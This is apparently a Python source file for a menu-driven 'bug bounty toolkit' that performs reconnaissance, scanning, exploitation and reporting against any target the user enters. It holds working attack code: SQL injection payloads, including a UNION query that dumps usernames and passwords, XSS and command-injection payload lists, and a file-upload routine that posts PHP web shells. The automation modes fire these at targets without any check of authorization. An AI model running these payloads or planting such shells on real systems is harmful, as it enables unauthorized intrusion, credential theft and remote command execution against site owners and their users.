import sys
import os
import json
import time
import threading
import queue
import subprocess
import requests
import socket
import re
from datetime import datetime
from urllib.parse import urlparse, quote
import argparse
import nmap
from bs4 import BeautifulSoup
import dns.resolver
import concurrent.futures

class BugBountyToolkit:
    def __init__(self):
        self.results = {}
        self.config = {
            'threads': 10,
            'timeout': 30,
            'user_agent': 'BugBountyToolkit/1.0',
            'output_dir': 'reports'
        }
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.config['user_agent']})
        
        if not os.path.exists(self.config['output_dir']):
            os.makedirs(self.config['output_dir'])
        
        print("""
╔══════════════════════════════════════╗
║   BUG BOUNTY TOOLKIT v1.0           ║
║   Recon | Scan | Exploit | Report   ║
╚══════════════════════════════════════╝
        """)
    
    def reconnaissance_menu(self):
        while True:
            print("\n" + "="*50)
            print("RECONNAISSANCE MENU")
            print("="*50)
            print("1. Subdomain Enumeration")
            print("2. Port Scanning")
            print("3. Technology Detection")
            print("4. DNS Information")
            print("5. WHOIS Lookup")
            print("6. Complete Recon (All methods)")
            print("7. Back to Main Menu")
            
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == "1":
                target = input("Enter target domain: ").strip()
                self.subdomain_enumeration(target)
            elif choice == "2":
                target = input("Enter target IP/Domain: ").strip()
                self.port_scanning(target)
            elif choice == "3":
                target = input("Enter target URL: ").strip()
                self.technology_detection(target)
            elif choice == "4":
                target = input("Enter target domain: ").strip()
                self.dns_lookup(target)
            elif choice == "5":
                target = input("Enter target domain: ").strip()
                self.whois_lookup(target)
            elif choice == "6":
                target = input("Enter target domain: ").strip()
                self.complete_recon(target)
            elif choice == "7":
                break
            else:
                print("Invalid option!")
    
    def subdomain_enumeration(self, domain):
        print(f"\n[*] Enumerating subdomains for: {domain}")
        
        subdomains = set()
        wordlist = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
            'ns2', 'admin', 'blog', 'dev', 'test', 'api', 'secure', 'portal',
            'dashboard', 'cpanel', 'webdisk', 'webmin', 'ns', 'dns', 'mx',
            'remote', 'server', 'vpn', 'm', 'mobile', 'static', 'img', 'image'
        ]
        
        for sub in wordlist:
            full_domain = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(full_domain)
                print(f"[+] Found: {full_domain} -> {ip}")
                subdomains.add(full_domain)
            except:
                continue
        
        with open(f"reports/{domain}_subdomains.txt", "w") as f:
            for sub in subdomains:
                f.write(f"{sub}\n")
        
        print(f"\n[+] Found {len(subdomains)} subdomains")
        print(f"[+] Saved to: reports/{domain}_subdomains.txt")
        return list(subdomains)
    
    def port_scanning(self, target):
        print(f"\n[*] Scanning ports for: {target}")
        
        try:
            scanner = nmap.PortScanner()
            scanner.scan(target, '1-1000', arguments='-T4')
            
            print("\nOpen Ports:")
            print("-" * 40)
            print("PORT\tSTATE\tSERVICE")
            
            for host in scanner.all_hosts():
                for proto in scanner[host].all_protocols():
                    ports = scanner[host][proto].keys()
                    for port in sorted(ports):
                        state = scanner[host][proto][port]['state']
                        service = scanner[host][proto][port]['name']
                        if state == 'open':
                            print(f"{port}\t{state}\t{service}")
            
            print(f"\n[+] Scan completed for {target}")
        except Exception as e:
            print(f"[-] Error during port scan: {e}")
    
    def technology_detection(self, url):
        print(f"\n[*] Detecting technologies for: {url}")
        
        try:
            response = self.session.get(url, timeout=self.config['timeout'])
            headers = response.headers
            
            tech_detected = []
            
            technologies = {
                'Server': headers.get('Server', ''),
                'X-Powered-By': headers.get('X-Powered-By', ''),
                'X-AspNet-Version': headers.get('X-AspNet-Version', ''),
                'X-AspNetMvc-Version': headers.get('X-AspNetMvc-Version', '')
            }
            
            for tech, value in technologies.items():
                if value:
                    print(f"[+] {tech}: {value}")
                    tech_detected.append(f"{tech}: {value}")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            meta_tags = soup.find_all('meta', {'name': ['generator', 'framework']})
            for meta in meta_tags:
                content = meta.get('content', '')
                if content:
                    print(f"[+] Meta Generator: {content}")
                    tech_detected.append(f"Meta: {content}")
            
            scripts = soup.find_all('script')
            for script in scripts:
                src = script.get('src', '')
                if 'jquery' in src.lower():
                    print("[+] jQuery detected")
                    tech_detected.append("jQuery")
                if 'react' in src.lower():
                    print("[+] React detected")
                    tech_detected.append("React")
                if 'vue' in src.lower():
                    print("[+] Vue.js detected")
                    tech_detected.append("Vue.js")
            
            return tech_detected
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return []
    
    def dns_lookup(self, domain):
        print(f"\n[*] DNS information for: {domain}")
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                print(f"\n{record_type} Records:")
                for rdata in answers:
                    print(f"  {rdata}")
            except:
                continue
    
    def whois_lookup(self, domain):
        print(f"\n[*] WHOIS lookup for: {domain}")
        
        try:
            import whois
            w = whois.whois(domain)
            
            print(f"\nDomain: {w.domain_name}")
            print(f"Registrar: {w.registrar}")
            print(f"Creation Date: {w.creation_date}")
            print(f"Expiration Date: {w.expiration_date}")
            print(f"Name Servers: {w.name_servers}")
            
        except ImportError:
            print("[-] Install python-whois: pip install python-whois")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def complete_recon(self, domain):
        print(f"\n[*] Starting complete reconnaissance on: {domain}")
        
        print("\n[PHASE 1] Subdomain Enumeration")
        subdomains = self.subdomain_enumeration(domain)
        
        print("\n[PHASE 2] Port Scanning")
        for sub in subdomains[:3]:
            try:
                ip = socket.gethostbyname(sub)
                self.port_scanning(ip)
            except:
                continue
        
        print("\n[PHASE 3] Technology Detection")
        for sub in subdomains[:5]:
            try:
                url = f"http://{sub}"
                self.technology_detection(url)
            except:
                continue
        
        print("\n[PHASE 4] DNS Information")
        self.dns_lookup(domain)
        
        print("\n[PHASE 5] WHOIS Lookup")
        self.whois_lookup(domain)
        
        print(f"\n[+] Complete reconnaissance finished for {domain}")
    
    def vulnerability_scanning_menu(self):
        while True:
            print("\n" + "="*50)
            print("VULNERABILITY SCANNING MENU")
            print("="*50)
            print("1. SQL Injection Scanner")
            print("2. XSS Scanner")
            print("3. Directory Bruteforce")
            print("4. CORS Misconfiguration")
            print("5. SSL/TLS Scanner")
            print("6. Complete Vulnerability Scan")
            print("7. Back to Main Menu")
            
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == "1":
                url = input("Enter target URL: ").strip()
                self.sql_injection_scan(url)
            elif choice == "2":
                url = input("Enter target URL: ").strip()
                self.xss_scan(url)
            elif choice == "3":
                url = input("Enter target URL: ").strip()
                self.directory_bruteforce(url)
            elif choice == "4":
                url = input("Enter target URL: ").strip()
                self.cors_scan(url)
            elif choice == "5":
                domain = input("Enter target domain: ").strip()
                self.ssl_scan(domain)
            elif choice == "6":
                url = input("Enter target URL: ").strip()
                self.complete_vuln_scan(url)
            elif choice == "7":
                break
            else:
                print("Invalid option!")
    
    def sql_injection_scan(self, url):
        print(f"\n[*] Testing SQL Injection on: {url}")
        
        payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "' AND 1=2 UNION SELECT 1,2,3--",
            "' OR 1=1--",
            "admin'--",
            "1' ORDER BY 1--",
            "1' AND sleep(5)--"
        ]
        
        vulnerable = False
        
        try:
            response = self.session.get(url)
            for payload in payloads:
                test_url = f"{url}?id={quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    
                    error_messages = [
                        "sql syntax",
                        "mysql",
                        "sqlite",
                        "oracle",
                        "postgresql",
                        "microsoft sql",
                        "syntax error",
                        "unclosed quotation",
                        "warning: mysql"
                    ]
                    
                    for error in error_messages:
                        if error in resp.text.lower():
                            print(f"[!] Possible SQL Injection: {payload}")
                            vulnerable = True
                            break
                    
                except:
                    continue
            
            if not vulnerable:
                print("[-] No SQL Injection vulnerabilities found")
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def xss_scan(self, url):
        print(f"\n[*] Testing XSS on: {url}")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        vulnerable = False
        
        for payload in payloads:
            try:
                test_url = f"{url}?q={quote(payload)}"
                resp = self.session.get(test_url, timeout=10)
                
                if payload in resp.text:
                    print(f"[!] Possible XSS: {payload}")
                    vulnerable = True
                    
            except:
                continue
        
        if not vulnerable:
            print("[-] No XSS vulnerabilities found")
    
    def directory_bruteforce(self, url):
        print(f"\n[*] Directory bruteforce on: {url}")
        
        wordlist = [
            'admin', 'login', 'dashboard', 'panel', 'wp-admin', 'administrator',
            'backup', 'config', 'database', 'db', 'test', 'debug', 'api',
            'secret', 'hidden', 'private', 'secure', 'auth', 'auth/login',
            'phpmyadmin', 'mysql', 'sql', 'cgi-bin', 'cgi', 'bash', 'sh',
            'bin', 'root', 'user', 'users', 'account', 'accounts'
        ]
        
        found_dirs = []
        
        for word in wordlist:
            test_url = f"{url.rstrip('/')}/{word}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200:
                    print(f"[+] Found: {test_url} (Status: {resp.status_code})")
                    found_dirs.append(test_url)
                elif resp.status_code == 403:
                    print(f"[+] Found (Forbidden): {test_url}")
                    found_dirs.append(f"{test_url} (403)")
                    
            except:
                continue
        
        print(f"\n[+] Found {len(found_dirs)} directories")
        return found_dirs
    
    def cors_scan(self, url):
        print(f"\n[*] Checking CORS misconfiguration on: {url}")
        
        origin = "https://evil.com"
        headers = {'Origin': origin}
        
        try:
            resp = self.session.get(url, headers=headers)
            cors_header = resp.headers.get('Access-Control-Allow-Origin', '')
            
            if cors_header == '*':
                print("[!] CORS Misconfiguration: Wildcard (*) allowed")
                return True
            elif cors_header == origin:
                print("[!] CORS Misconfiguration: Reflected origin")
                return True
            elif 'Access-Control-Allow-Credentials' in resp.headers:
                print("[!] CORS with credentials allowed")
                return True
            else:
                print("[-] No CORS misconfiguration found")
                return False
                
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def ssl_scan(self, domain):
        print(f"\n[*] SSL/TLS scan for: {domain}")
        
        try:
            import ssl
            import OpenSSL
            
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    print(f"[+] SSL Certificate Info for {domain}:")
                    print(f"    Cipher: {cipher[0]}")
                    print(f"    Protocol: {cipher[1]}")
                    print(f"    Bits: {cipher[2]}")
                    
                    if 'subject' in cert:
                        for sub in cert['subject']:
                            for key, value in sub:
                                if key == 'commonName':
                                    print(f"    Common Name: {value}")
                    
                    not_after = cert.get('notAfter', '')
                    if not_after:
                        print(f"    Expires: {not_after}")
                        
        except Exception as e:
            print(f"[-] SSL Error: {e}")
    
    def complete_vuln_scan(self, url):
        print(f"\n[*] Starting complete vulnerability scan on: {url}")
        
        print("\n[PHASE 1] SQL Injection Testing")
        self.sql_injection_scan(url)
        
        print("\n[PHASE 2] XSS Testing")
        self.xss_scan(url)
        
        print("\n[PHASE 3] Directory Bruteforce")
        self.directory_bruteforce(url)
        
        print("\n[PHASE 4] CORS Testing")
        self.cors_scan(url)
        
        print("\n[PHASE 5] SSL/TLS Testing")
        parsed = urlparse(url)
        if parsed.netloc:
            self.ssl_scan(parsed.netloc)
        
        print(f"\n[+] Complete vulnerability scan finished for {url}")
    
    def exploitation_menu(self):
        while True:
            print("\n" + "="*50)
            print("EXPLOITATION MENU")
            print("="*50)
            print("1. SQL Injection Exploit")
            print("2. XSS Payload Generator")
            print("3. Command Injection")
            print("4. File Upload Exploit")
            print("5. Back to Main Menu")
            
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                url = input("Enter vulnerable URL (with parameter): ").strip()
                param = input("Enter vulnerable parameter: ").strip()
                self.exploit_sql(url, param)
            elif choice == "2":
                self.xss_payload_generator()
            elif choice == "3":
                url = input("Enter target URL: ").strip()
                self.command_injection(url)
            elif choice == "4":
                url = input("Enter upload URL: ").strip()
                self.file_upload_test(url)
            elif choice == "5":
                break
            else:
                print("Invalid option!")
    
    def exploit_sql(self, url, param):
        print(f"\n[*] Exploiting SQL Injection on {url}")
        print(f"[*] Parameter: {param}")
        
        print("\nAvailable options:")
        print("1. Extract database version")
        print("2. Extract database name")
        print("3. Extract table names")
        print("4. Extract column names")
        print("5. Dump table data")
        
        choice = input("\nSelect option (1-5): ").strip()
        
        payloads = {
            '1': f"'+UNION+SELECT+@@version,NULL--",
            '2': f"'+UNION+SELECT+database(),NULL--",
            '3': f"'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--",
            '4': f"'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--",
            '5': f"'+UNION+SELECT+CONCAT(username,':',password),NULL+FROM+users--"
        }
        
        if choice in payloads:
            exploit_url = f"{url}?{param}={payloads[choice]}"
            print(f"\n[*] Sending payload: {payloads[choice]}")
            
            try:
                resp = self.session.get(exploit_url)
                soup = BeautifulSoup(resp.text, 'html.parser')
                text = soup.get_text()
                
                print("\n[*] Response:")
                print("-" * 40)
                print(text[:500])
                print("-" * 40)
                
            except Exception as e:
                print(f"[-] Error: {e}")
        else:
            print("[-] Invalid option")
    
    def xss_payload_generator(self):
        print("\n" + "="*50)
        print("XSS PAYLOAD GENERATOR")
        print("="*50)
        
        payloads = [
            "Basic: <script>alert('XSS')</script>",
            "IMG: <img src=x onerror=alert('XSS')>",
            "SVG: <svg/onload=alert('XSS')>",
            "Body: <body onload=alert('XSS')>",
            "Input: \"><script>alert('XSS')</script>",
            "JavaScript: javascript:alert('XSS')",
            "Iframe: <iframe src=javascript:alert('XSS')>",
            "Form: <form><button formaction=javascript:alert('XSS')>X</button>",
            "Meta: <meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">"
        ]
        
        print("\nAvailable Payloads:")
        for i, payload in enumerate(payloads, 1):
            print(f"{i}. {payload}")
        
        choice = input("\nSelect payload number to copy: ").strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(payloads):
                payload = payloads[idx].split(": ")[1]
                print(f"\n[*] Payload: {payload}")
                print("[*] Payload copied to clipboard (if supported)")
            else:
                print("[-] Invalid selection")
        except:
            print("[-] Invalid input")
    
    def command_injection(self, url):
        print(f"\n[*] Testing Command Injection on: {url}")
        
        payloads = [
            ";id",
            "|id",
            "||id",
            "&&id",
            "`id`",
            "$(id)",
            "';id'",
            "\";id\""
        ]
        
        for payload in payloads:
            test_url = f"{url}?cmd={quote(payload)}"
            try:
                resp = self.session.get(test_url, timeout=10)
                if 'uid=' in resp.text or 'gid=' in resp.text:
                    print(f"[!] Possible Command Injection: {payload}")
                    print(f"[*] Response snippet: {resp.text[:200]}")
                    return True
            except:
                continue
        
        print("[-] No command injection found")
        return False
    
    def file_upload_test(self, url):
        print(f"\n[*] Testing File Upload on: {url}")
        
        test_files = {
            'php_shell': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            'html_shell': ('shell.html', '<script>alert("XSS")</script>', 'text/html'),
            'jpg_shell': ('shell.jpg.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
        }
        
        for name, (filename, content, mime) in test_files.items():
            print(f"\n[*] Testing {filename}")
            
            files = {'file': (filename, content, mime)}
            
            try:
                resp = self.session.post(url, files=files)
                print(f"[*] Status: {resp.status_code}")
                print(f"[*] Response: {resp.text[:200]}")
                
                if resp.status_code == 200:
                    print("[!] File might have been uploaded")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def reporting_menu(self):
        while True:
            print("\n" + "="*50)
            print("REPORTING MENU")
            print("="*50)
            print("1. Generate HTML Report")
            print("2. Generate Markdown Report")
            print("3. Generate JSON Report")
            print("4. View Previous Reports")
            print("5. Back to Main Menu")
            
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                self.generate_html_report()
            elif choice == "2":
                self.generate_markdown_report()
            elif choice == "3":
                self.generate_json_report()
            elif choice == "4":
                self.view_reports()
            elif choice == "5":
                break
            else:
                print("Invalid option!")
    
    def generate_html_report(self):
        target = input("Enter target name for report: ").strip()
        findings = input("Enter findings (comma separated): ").strip()
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"reports/report_{target}_{timestamp}.html"
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Bug Bounty Report - {target}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; border-radius: 5px; }}
        .section {{ margin: 20px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; }}
        .finding {{ background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #3498db; }}
        .critical {{ border-left-color: #e74c3c; }}
        .high {{ border-left-color: #e67e22; }}
        .medium {{ border-left-color: #f1c40f; }}
        .low {{ border-left-color: #2ecc71; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Bug Bounty Report</h1>
        <h2>Target: {target}</h2>
        <p>Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>
    
    <div class="section">
        <h3>Executive Summary</h3>
        <p>Security assessment conducted on {target}. Below are the findings.</p>
    </div>
    
    <div class="section">
        <h3>Findings</h3>
        {''.join([f'<div class="finding high"><strong>Finding {i+1}:</strong> {finding.strip()}</div>' 
                  for i, finding in enumerate(findings.split(','))])}
    </div>
    
    <div class="section">
        <h3>Recommendations</h3>
        <ul>
            <li>Implement input validation</li>
            <li>Use parameterized queries</li>
            <li>Enable security headers</li>
            <li>Regular security audits</li>
        </ul>
    </div>
</body>
</html>
        """
        
        with open(filename, 'w') as f:
            f.write(html_content)
        
        print(f"[+] HTML report saved to: {filename}")
    
    def generate_markdown_report(self):
        target = input("Enter target name for report: ").strip()
        findings = input("Enter findings (comma separated): ").strip()
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"reports/report_{target}_{timestamp}.md"
        
        markdown = f"""
# Bug Bounty Report

## Target: {target}
**Date:** {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
**Tester:** Bug Bounty Toolkit

## Executive Summary
Security assessment conducted on {target}.

## Findings

{chr(10).join([f'### Finding {i+1}: {finding.strip()}' + chr(10) + '**Severity:** High' + chr(10) + '**Description:** Vulnerability found' for i, finding in enumerate(findings.split(','))])}

## Recommendations
1. Implement proper input validation
2. Use prepared statements for SQL queries
3. Implement CSP headers
4. Regular security testing
5. Keep software updated

## Timeline
- Start: {datetime.now().strftime("%Y-%m-%d")}
- End: {datetime.now().strftime("%Y-%m-%d")}
        """
        
        with open(filename, 'w') as f:
            f.write(markdown)
        
        print(f"[+] Markdown report saved to: {filename}")
    
    def generate_json_report(self):
        target = input("Enter target name for report: ").strip()
        
        report = {
            "target": target,
            "date": datetime.now().isoformat(),
            "findings": [],
            "summary": "Security assessment report",
            "metadata": {
                "tool": "Bug Bounty Toolkit",
                "version": "1.0"
            }
        }
        
        while True:
            finding = input("Enter finding (or 'done' to finish): ").strip()
            if finding.lower() == 'done':
                break
            
            severity = input("Enter severity (critical/high/medium/low): ").strip()
            description = input("Enter description: ").strip()
            
            report["findings"].append({
                "id": len(report["findings"]) + 1,
                "finding": finding,
                "severity": severity,
                "description": description,
                "timestamp": datetime.now().isoformat()
            })
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"reports/report_{target}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        
        print(f"[+] JSON report saved to: {filename}")
    
    def view_reports(self):
        print("\n" + "="*50)
        print("AVAILABLE REPORTS")
        print("="*50)
        
        if not os.path.exists('reports'):
            print("[-] No reports directory found")
            return
        
        reports = [f for f in os.listdir('reports') if f.endswith(('.html', '.md', '.json', '.txt'))]
        
        if not reports:
            print("[-] No reports found")
            return
        
        for i, report in enumerate(reports, 1):
            print(f"{i}. {report}")
        
        try:
            choice = input("\nSelect report number to view (or 'q' to quit): ").strip()
            if choice.lower() == 'q':
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(reports):
                filename = f"reports/{reports[idx]}"
                with open(filename, 'r') as f:
                    content = f.read()
                    print(f"\n{'='*50}")
                    print(f"Content of {reports[idx]}:")
                    print(f"{'='*50}")
                    print(content[:1000])
                    if len(content) > 1000:
                        print("\n... (truncated)")
            else:
                print("[-] Invalid selection")
        except:
            print("[-] Invalid input")
    
    def automation_menu(self):
        print("\n" + "="*50)
        print("AUTOMATION")
        print("="*50)
        
        target = input("Enter target URL/Domain: ").strip()
        
        print("\nSelect automation mode:")
        print("1. Quick Scan (Basic recon + vuln scan)")
        print("2. Full Scan (Complete recon + vuln scan + exploit test)")
        print("3. Custom Automation")
        
        choice = input("\nSelect option (1-3): ").strip()
        
        if choice == "1":
            self.quick_automation(target)
        elif choice == "2":
            self.full_automation(target)
        elif choice == "3":
            self.custom_automation(target)
        else:
            print("Invalid option!")
    
    def quick_automation(self, target):
        print(f"\n[*] Starting Quick Automation for: {target}")
        
        print("\n[1/3] Reconnaissance...")
        self.subdomain_enumeration(target)
        
        print("\n[2/3] Vulnerability Scanning...")
        url = f"http://{target}" if not target.startswith('http') else target
        self.complete_vuln_scan(url)
        
        print("\n[3/3] Generating Report...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"reports/quick_scan_{target}_{timestamp}.txt"
        
        with open(report_file, 'w') as f:
            f.write(f"Quick Scan Report for {target}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write("\nSummary: Quick security assessment completed.\n")
        
        print(f"[+] Quick automation completed. Report: {report_file}")
    
    def full_automation(self, target):
        print(f"\n[*] Starting Full Automation for: {target}")
        print("[*] This may take several minutes...")
        
        results = {}
        
        print("\n[PHASE 1: RECONNAISSANCE]")
        results['subdomains'] = self.subdomain_enumeration(target)
        
        print("\n[PHASE 2: VULNERABILITY SCANNING]")
        url = f"http://{target}" if not target.startswith('http') else target
        self.complete_vuln_scan(url)
        
        print("\n[PHASE 3: EXPLOITATION TESTING]")
        self.command_injection(url)
        
        print("\n[PHASE 4: REPORT GENERATION]")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"reports/full_scan_{target}_{timestamp}.json"
        
        results['scan_date'] = datetime.now().isoformat()
        results['target'] = target
        
        with open(report_file, 'w') as f:
            json.dump(results, f, indent=4)
        
        print(f"[+] Full automation completed. Report: {report_file}")
    
    def custom_automation(self, target):
        print(f"\n[*] Custom Automation for: {target}")
        
        print("\nSelect tasks to include:")
        print("1. Subdomain Enumeration")
        print("2. Port Scanning")
        print("3. SQL Injection Scan")
        print("4. XSS Scan")
        print("5. Directory Bruteforce")
        print("6. All of the above")
        
        tasks = input("\nEnter task numbers (comma separated): ").strip().split(',')
        
        results = {'target': target, 'tasks': []}
        url = f"http://{target}" if not target.startswith('http') else target
        
        for task in tasks:
            task = task.strip()
            if task == '1':
                print("\n[*] Running Subdomain Enumeration...")
                results['subdomains'] = self.subdomain_enumeration(target)
                results['tasks'].append('subdomain_enumeration')
            elif task == '2':
                print("\n[*] Running Port Scanning...")
                self.port_scanning(target)
                results['tasks'].append('port_scanning')
            elif task == '3':
                print("\n[*] Running SQL Injection Scan...")
                self.sql_injection_scan(url)
                results['tasks'].append('sql_injection_scan')
            elif task == '4':
                print("\n[*] Running XSS Scan...")
                self.xss_scan(url)
                results['tasks'].append('xss_scan')
            elif task == '5':
                print("\n[*] Running Directory Bruteforce...")
                results['directories'] = self.directory_bruteforce(url)
                results['tasks'].append('directory_bruteforce')
            elif task == '6':
                self.quick_automation(target)
                return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"reports/custom_scan_{target}_{timestamp}.json"
        
        with open(report_file, 'w') as f:
            json.dump(results, f, indent=4)
        
        print(f"\n[+] Custom automation completed. Report: {report_file}")
    
    def integrations_menu(self):
        while True:
            print("\n" + "="*50)
            print("INTEGRATIONS")
            print("="*50)
            print("1. Integrate with Nmap")
            print("2. Integrate with SQLMap (External)")
            print("3. Integrate with Burp Suite")
            print("4. Test Integration")
            print("5. Back to Main Menu")
            
            choice = input("\nSelect option (1-5): ").strip()
            
            if choice == "1":
                self.integrate_nmap()
            elif choice == "2":
                self.integrate_sqlmap()
            elif choice == "3":
                self.integrate_burp()
            elif choice == "4":
                self.test_integrations()
            elif choice == "5":
                break
            else:
                print("Invalid option!")
    
    def integrate_nmap(self):
        print("\n" + "="*50)
        print("NMAP INTEGRATION")
        print("="*50)
        
        target = input("Enter target for Nmap scan: ").strip()
        scan_type = input("Enter scan type (quick/full/service): ").strip().lower()
        
        nmap_args = {
            'quick': '-T4 -F',
            'full': '-T4 -A -v',
            'service': '-T4 -sV'
        }.get(scan_type, '-T4')
        
        print(f"\n[*] Running Nmap with arguments: {nmap_args}")
        
        try:
            import nmap
            scanner = nmap.PortScanner()
            scanner.scan(target, arguments=nmap_args)
            
            print("\nNmap Results:")
            print("-" * 40)
            
            for host in scanner.all_hosts():
                print(f"Host: {host}")
                for proto in scanner[host].all_protocols():
                    print(f"Protocol: {proto}")
                    ports = scanner[host][proto].keys()
                    for port in sorted(ports):
                        state = scanner[host][proto][port]['state']
                        service = scanner[host][proto][port]['name']
                        print(f"  Port {port}: {state} ({service})")
            
            print(f"\n[+] Nmap scan completed")
            
        except ImportError:
            print("[-] Install python-nmap: pip install python-nmap")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def integrate_sqlmap(self):
        print("\n" + "="*50)
        print("SQLMAP INTEGRATION")
        print("="*50)
        
        print("SQLMap is an external tool. Here's how to use it:")
        print("\nBasic usage:")
        print("sqlmap -u \"http://target.com/page.php?id=1\"")
        print("\nCommon options:")
        print("--dbs                    List databases")
        print("--tables                 List tables")
        print("--columns                List columns")
        print("--dump                   Dump table data")
        print("--batch                  Non-interactive mode")
        print("\nExample command:")
        print("sqlmap -u \"http://target.com/page.php?id=1\" --batch --dbs")
        
        use_now = input("\nDo you want to run SQLMap now? (y/n): ").strip().lower()
        
        if use_now == 'y':
            url = input("Enter vulnerable URL: ").strip()
            command = f"sqlmap -u \"{url}\" --batch --level=1"
            print(f"\n[*] Running: {command}")
            print("[*] Note: SQLMap must be installed separately")
    
    def integrate_burp(self):
        print("\n" + "="*50)
        print("BURP SUITE INTEGRATION")
        print("="*50)
        
        print("\nBurp Suite Integration Options:")
        print("1. Export targets to Burp")
        print("2. Import results from Burp")
        print("3. Configure proxy settings")
        
        choice = input("\nSelect option (1-3): ").strip()
        
        if choice == "1":
            target = input("Enter target URL: ").strip()
            print(f"\n[*] Add this to Burp Target Scope:")
            print(f"    {target}")
            print("\n[*] Or use Burp's REST API:")
            print(f"    curl -X POST http://burp:8090/target/scope -d 'url={target}'")
            
        elif choice == "2":
            print("\n[*] Import Burp results:")
            print("1. Export from Burp as XML")
            print("2. Save as burp_export.xml")
            print("3. Use our parser to import")
            
        elif choice == "3":
            proxy_host = input("Enter proxy host (default: 127.0.0.1): ").strip() or "127.0.0.1"
            proxy_port = input("Enter proxy port (default: 8080): ").strip() or "8080"
            
            self.session.proxies = {
                'http': f'http://{proxy_host}:{proxy_port}',
                'https': f'http://{proxy_host}:{proxy_port}'
            }
            
            print(f"\n[*] Proxy configured: {proxy_host}:{proxy_port}")
            print("[*] Make sure Burp is listening on this proxy")
    
    def test_integrations(self):
        print("\n" + "="*50)
        print("TESTING INTEGRATIONS")
        print("="*50)
        
        print("\n[*] Testing Nmap integration...")
        try:
            import nmap
            print("[+] Nmap: OK")
        except:
            print("[-] Nmap: Not available")
        
        print("\n[*] Testing network connectivity...")
        try:
            response = self.session.get("http://google.com", timeout=5)
            print("[+] Network: OK")
        except:
            print("[-] Network: No connectivity")
        
        print("\n[*] Testing proxy configuration...")
        if self.session.proxies:
            print(f"[+] Proxy: {self.session.proxies}")
        else:
            print("[+] Proxy: Not configured")
        
        print("\n[*] All integration tests completed")
    
    def main_menu(self):
        while True:
            print("\n" + "="*50)
            print("MAIN MENU - BUG BOUNTY TOOLKIT")
            print("="*50)
            print("1. Reconnaissance")
            print("2. Vulnerability Scanning")
            print("3. Exploitation")
            print("4. Reporting")
            print("5. Automation")
            print("6. Integrations")
            print("7. Exit")
            
            choice = input("\nSelect option (1-7): ").strip()
            
            if choice == "1":
                self.reconnaissance_menu()
            elif choice == "2":
                self.vulnerability_scanning_menu()
            elif choice == "3":
                self.exploitation_menu()
            elif choice == "4":
                self.reporting_menu()
            elif choice == "5":
                self.automation_menu()
            elif choice == "6":
                self.integrations_menu()
            elif choice == "7":
                print("\nThank you for using Bug Bounty Toolkit!")
                print("Stay ethical and happy hunting!")
                sys.exit(0)
            else:
                print("Invalid option!")

if __name__ == "__main__":
    toolkit = BugBountyToolkit()
    toolkit.main_menu()
